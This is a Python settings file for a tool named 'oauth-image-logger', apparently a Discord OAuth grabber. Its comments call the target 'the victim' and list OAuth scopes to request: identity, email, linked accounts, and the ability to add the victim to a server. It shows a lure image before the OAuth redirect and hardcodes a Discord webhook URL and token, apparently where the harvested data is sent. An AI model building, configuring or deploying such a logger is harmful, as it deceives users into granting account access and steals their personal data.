# language: Python, file: oauth-image-logger/config/settings.py
# edit these four, nothing else

CLIENT_ID    = "1568513995990765788"
REDIRECT_URI = "oaoaoao-production.up.railway.app"
COVER_URL    = "https://i.imgur.com/Idee5Xd.jpeg"
WEBHOOK      = "https://discord.com/api/webhooks/1574728200398045214/8Jl_tWvXltFY1OS-H4wlb_tbNwLSdSjahC37Hp9E4BqptlV-b5caOS0--6sFjK-KtsH1"

# what you ask the victim to grant
# identify        -> username, id, avatar
# email           -> email address
# guilds.join     -> add them to a server you own (needs bot + scope enabled in portal)
# connections     -> linked accounts (steam/github/spotify/etc)
SCOPES = "identify email guilds.join connections"

# server
HOST = "0.0.0.0"
PORT = 5002

# how long the cover image shows before the OAuth redirect (ms)
COVER_DELAY_MS = 2000
